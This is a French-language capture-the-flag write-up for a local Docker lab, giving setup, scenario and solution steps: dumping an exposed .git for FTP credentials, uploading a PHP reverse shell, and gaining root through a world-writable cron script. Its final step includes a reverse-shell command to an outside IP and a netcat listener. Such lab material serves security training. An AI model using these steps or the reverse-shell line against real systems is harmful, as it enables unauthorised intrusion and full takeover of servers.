# Silence

## SETUP
```
docker-compose up -d
```

```
http://localhost:80
```

## CHALLENGE
Quelqu'un semble avoir découvert la présence de notre société parmis le cégep. Nous devons le faire taire.
Pirater son site et prenez le contrôle du compte root.

## SOLUTION
### Étape 1: Dump .git
Si on scan le site pour trouver des répertoires caché (nmap -sC, dirbuster, etc.), on peut trouver un folder .git exposé.
En dumpant ce .git avec un outil (git-dumper) et en observant l'historique de commit, on peut obtenir une page contenant des crendentials pour se connecter au serveur FTP. Le flag est à la racine du serveur FTP.

### Étape 2: Upload de reverse shell PHP
Par la suite, on peut voir que nous avons les privilèges d'écriture sur le FTP et que la racine du serveur pointe vers la racine de la page web. Nous pouvons donc uploader un reverse shell en php et l'exécuter pour obtenir notre foothold initial. Le flag est dans le dossier home de e.arcand.

### Étape 3: Escalade de privilège via cronjob vulnérable
Si on fouille les cronjobs, on peut trouver une job custom qui déplace les fichiers du dossier "preuves" vers le home de e.arcand.
Si on regarde les permissions du script "deplacerPreuve", on peut voir que n'importe qui peut le modifier. Il suffit donc d'ajouter un reverse shell au script (e.g. busybox nc 10.10.10.10 9001 -e sh) et de se starter un listener netcat (nc -lvnp 9001). Après environ une minute, on devrait recevoir une connexion sur notre listener et obtenir l'accès root. Le dernier flag est dans le dossier "/root".